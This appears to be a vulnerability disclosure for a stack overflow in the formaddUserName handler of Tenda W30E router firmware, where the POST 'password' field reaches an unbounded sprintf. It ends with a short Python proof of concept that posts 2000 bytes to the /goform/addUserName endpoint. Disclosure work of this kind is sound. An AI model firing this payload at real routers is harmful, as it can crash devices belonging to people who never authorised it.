## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2218.html

## Affected version

W30Ev1.0 V1.0.1.25(633)

## Vulnerability details

The Tenda W30Ev1.0 V1.0.1.25(633) firmware has a stack overflow vulnerability in the `formaddUserName` function. The `v23` variable receives the `password` parameter from a POST request and is used in statement `sprintf(v12, "#%s", v23);`, which caused the buffer overflow attack.

![image-20240409112450535](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240409112450535.png)

![image-20240409112318002](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240409112318002.png)

![image-20240409112347063](C:\Users\杨浩然\AppData\Roaming\Typora\typora-user-images\image-20240409112347063.png)

The user-provided `password` can trigger this security vulnerability.

## POC

```python
import requests

IP = "192.168.84.101"
url = f"http://{IP}/goform/addUserName"
payload = b'a'*2000
data = {"password": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240409110959426](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240409110959426.png)